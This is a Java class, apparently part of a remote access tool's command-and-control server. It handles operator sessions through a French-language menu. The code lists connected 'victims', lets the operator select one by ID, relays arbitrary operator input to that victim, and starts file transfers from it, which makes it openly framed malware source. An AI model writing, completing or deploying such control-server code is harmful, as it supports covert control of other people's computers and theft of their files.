package Modele;
import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URISyntaxException;
import java.util.ArrayList;

import Interfaces.Observable;
import Interfaces.ObservableUser;
import Interfaces.Observateur;


public class ConnexionUser implements ObservableUser{

	private int id;	
	
	private Socket socketTransition;
	private Observateur serverStart;
	private MessageListennerUser EcouteurMessage;
	private PrintWriter BufferDEnvoie;
	private boolean ConnecteAvecVictime;
	private Observable victimeConnectee;
	
	private boolean ModeSelectionVictim;
	
	public ConnexionUser(Socket soc, ServerStart s, int id) {
		this.serverStart = s;
		this.id = id;
		this.ConnecteAvecVictime = false;
		this.socketTransition = soc;
		this.updateConnectionUserInCentralServer();
		try {
			this.BufferDEnvoie = new PrintWriter(this.socketTransition.getOutputStream());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		this.ModeSelectionVictim = false;
		this.EcouteurMessage = new MessageListennerUser(this);
		this.EcouteurMessage.start();
		this.envoyerMessage(this.getInfosCmds()+"\n");
		System.out.println("(serveur) : Utilisateur connectée sur port "+this.socketTransition.getLocalPort());
	}
	
	public int getId() {
		return id;
	}
	
	public Observable getVictimeConnectee() {
		return victimeConnectee;
	}
	
	public void setConnecteAvecVictime(boolean connecteAvecVictime) {
		ConnecteAvecVictime = connecteAvecVictime;
	}
	
	public boolean getConnecteAvecVictime() {
		return this.ConnecteAvecVictime ;
	}
	
	
	public void disconnect() {
		try {
			this.EcouteurMessage.close();
			
			
		} catch (Exception e) {
			// TODO Auto-generated catch block
			System.out.println("probleme !!");
		}
		try {
			this.socketTransition.close();
		} catch (IOException e) {
		}
		
		this.updateDisconnectionUserInCentralServer();
		
		
	}

	@Override
	public void updateConnectionUserInCentralServer() {
		// TODO Auto-generated method stub
		this.serverStart.updateConnectionUser(this);
	}

	@Override
	public void updateDisconnectionUserInCentralServer() {
		// TODO Auto-generated method stub
		this.serverStart.updateDisconnectionUser(this);
	}
	
	public void envoyerMessage(String m){
		this.BufferDEnvoie.println(m);
		this.BufferDEnvoie.flush();
	}
	
	public Socket getSocketTrans() {
		return this.socketTransition;
	}
	
	public void TraitementMesssageRecu(String message) {
		
		if(message == null) {			
			System.out.println("message nulle => deconnection lancée");
			this.disconnect();
		} else {
			this.envoyerMessage(this.ChoixTraitement(message));
		}
		
	}
	
	//Algorithme de base de la reception des messages des clients
	public String ChoixTraitement(String message) {
		String messageRetour ="--------------\n\n";
		
		if(this.ModeSelectionVictim) {
			if(message.toLowerCase().startsWith("annuler")) {
				this.ModeSelectionVictim = false;
				messageRetour += "Retour au menu precedent.";
			}else {
				String result = this.SelectVictimById(message);
				this.ModeSelectionVictim = result.toLowerCase().startsWith("mauvais id") ? true : false; // On laisse le booleen a true si le message entre n'etait pas un entier pour que l'utilisateur reessaye 
				messageRetour  += result;
			}
		}else {//cas commun + cas de connexion avec victime
			if(message.trim().equals("1")) messageRetour  += this.getNbUsersConnected() ;
			else if (message.trim().equals("2")) messageRetour  += this.getNbVictimConnected() ;
			else if (message.trim().equals("3")) messageRetour  += this.getListeVictimConnected();
			else if (message.trim().equals("4")) messageRetour  += this.getListeConnexionEnvoiFichier();
			else if (message.trim().equals("5")) messageRetour  += this.getModeVictimConnected();			
			else if (message.trim().equals("6")) messageRetour  += this.redemarrerServeur();
			else if (message.trim().toLowerCase().equals("help")) messageRetour  += this.getInfosCmds() ;
			else if (this.ConnecteAvecVictime){ // cas ou l'utilisateur est connecte avec la victime
				if(message.toLowerCase().startsWith("deconnexion")) messageRetour += this.deconnexionVictime();
				else if (message.trim().startsWith("envoi")) messageRetour  += this.lancerEnvoiFichier(message);
				else this.victimeConnectee.envoyerMessage(message);//A continuer	
			}			
			else messageRetour  += "Aucune reponse possible encore ..";
		}
		
		return messageRetour+"\n"; // le "\n" est utile ici pour ajouter automatiquement un saut de ligne a l'affichage du client
	}
		

	
	// --------------- FONCTIONS UTILISABLES PAR L'UTILISATEUR -----------------------



	private String lancerEnvoiFichier(String message) {
		ConnexionEnvoiFichier c = new ConnexionEnvoiFichier(this.serverStart, this.serverStart.getServeurSocketFichier(), this.victimeConnectee, this);
		this.serverStart.getListConnexionEnvoiFichier().add(c);
		c.start();
		
		this.victimeConnectee.envoyerMessage(message);
		
		return "Creation de l'instance d'envoi de fichiers";
	}

	private String getListeConnexionEnvoiFichier() {
		String reponse = "";
		ArrayList<ConnexionEnvoiFichier> liste = this.serverStart.getListConnexionEnvoiFichier();
		
		if(liste.size() < 1) return "Il n'y a aucune instance d'echange de fichiers en cours";
		
		reponse += "Liste des couples d'instances d'envoi de fichiers en cours: \n\n";
		for (int i = 0; i< liste.size(); i++) {
			ConnexionEnvoiFichier connexion = liste.get(i);
			reponse += " - Couple No"+(i+1)+" : Utilisateur d'ID = "+connexion.getUser().getId()+"\t Victime d'ID = "+connexion.getVictim().getIdInstance()+"\n";
		}
		return reponse;
	}

	private String redemarrerServeur() {
		String reponse;
		try {
			File pathFile = new File(ServerStart.class.getProtectionDomain().getCodeSource().getLocation().toURI());
			if(pathFile.toString().endsWith(".jar"))  {
				reponse = this.serverStart.redemarrageDuServeur(pathFile.toString()); // si cette etape passe, c'est qu'il y a eu une erreur, car le serveur devrait deja avoir redemarre
			}else {
				reponse = "Le serveur n'est pas en prod -> il est lanc� sur IDE et donc il n'est pas possible de le redemarrer.";
			}			
		} catch (URISyntaxException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
			reponse = "Erreur lors de la recuperation du chemin URI du programme : "+e1.getMessage();
		}
		return reponse;
	}


	
	private String SelectVictimById(String message) {
		int id;
		try {
			id = Integer.parseInt(message);
			for (Observable victim : this.serverStart.getlistVictimsConnected()) {
				if(victim.getIdInstance() == id) {
					this.victimeConnectee = victim;
					this.victimeConnectee.setUserConnecte(this);
					this.ConnecteAvecVictime = true;
					this.serverStart.PasserVictimeEnListeTransaction(victim);
					return "Vous etes connecte avec la victime Victime d'id = "+victim.getIdInstance();
				}
			}
			
			return "La victime avec l'identifiant "+id+" n'existe pas dans la liste des victimes connectees au serveur";
		}catch(Exception e) {
			return "Mauvais ID rentre, veuillez entrer un entier !";
		}		
	}

	private String getModeVictimConnected() {
		String result ="";
		this.ModeSelectionVictim = true;
		result += "Rappel : Liste des victimes connectees = \n"+getListeVictimConnected();		
		result += "\n\nA present, entrez l'identifiant de la victime sur laquelle vous voulez vous connecter ou tappez 'annuler' pour revenir en arriere";
				
		return result;
	}
	
	public void setVictimeConnecte (Observable victim) {
		this.victimeConnectee = victim;
	}

	private String deconnexionVictime() {
		Observable victime = this.victimeConnectee;
		this.ConnecteAvecVictime = false;
		this.victimeConnectee.setUserConnecte(null);
		this.serverStart.PasserVictimeEnListeConnectee(this.victimeConnectee);
		this.victimeConnectee = null;
		return "Vous avez bien ete deconnecte de la victime d'id = "+victime.getIdInstance();
	}
	
	public String getNbUsersConnected() {
		return "Nombre d'utilisateurs connectees sur le serveur = "+Integer.toString(this.serverStart.getListUsersConnected().size());
	}
	
	public String getListeVictimConnected() {
		
		String liste = "";
		ArrayList<Observable> listeVictimesDispo = this.serverStart.getlistVictimsConnected();
		ArrayList<Observable> listeVictimesEnTransac = this.serverStart.getlistVictimsTransaction();
		int nbDispo = listeVictimesDispo.size();
		int nbEnTransac = listeVictimesEnTransac.size();
		
		if(nbDispo < 1) {
			liste += "Il n'y a aucune victime disponible...";
		}else {
			liste="Liste des victimes disponibles ("+nbDispo+" disponibles) :\n";
			for(int i = 0; i<listeVictimesDispo.size(); i++) {
				liste += "- Victim No"+(i+1)+" : id = "+listeVictimesDispo.get(i).getIdInstance()+" IP = NOT IMPLEMENTED\n";
			}
		}
		if(nbEnTransac < 1) {
			liste += "\nIl n'y a aucune victime en transaction...";
		}else {
			//---Victimes en transaction
			liste += "\nListe des victimes utilisees par un user ("+nbEnTransac+" utilises) :\n";
			for(int i = 0; i<listeVictimesEnTransac.size(); i++) {
				liste += "- Victim No"+(i+1)+" : id = "+listeVictimesEnTransac.get(i).getIdInstance()+" IP = NOT IMPLEMENTED -> utilisee par l'utilisateur d'id = A IMPLEMENTER";
			}
		}
		return liste;
	}
	
	

	private String getNbVictimEnTransaction() {
		return Integer.toString(this.serverStart.getlistVictimsTransaction().size());
	}


	public String getNbVictimConnected() {
		return "Nombre de victimes connectees sur le serveur = "+Integer.toString(this.serverStart.getlistVictimsConnected().size()+this.serverStart.getlistVictimsTransaction().size());
	}
	
	public void disconnection() {// A FAIRE : renvoyer un booleen indiquant si la déconexion s'est bien effectuée pour pouvoir renvoyer une confirmation de déconnexion au client user
		this.disconnect();
	}
	
	public String getInfosCmds() {
		String infos = "";
		
		
		if(this.ConnecteAvecVictime) {
			infos += "*** Vous etes connecte avec la victime NOM -> NON IMPLEMENTE";
			infos += "\nCommandes du serveur : "
					+"\n 'deconnexion' = se deconnecter de la victime"
					+"\n 'help' = affichage de la liste des commandes\n";
		}else infos += "*** Vous etes connecte au serveur";
		infos += "\nCommandes de base : "
				+ "\n '1' = Nombre Utilisateurs connectees"
				+ "\n '2' = Nombre victimes connectees"
				+ "\n '3' = Liste victimes connectees"
				+ "\n '4' = Liste des couples(user,victim) d'envoi de fichiers"
				+ "\n '5' = Selection d'une victime d'identifiant "
				+ "\n '6' = Redemarrage du serveur "
				+ "\n 'help' = Affichage de la liste de commandes";

		return infos;
	}
	
	
}
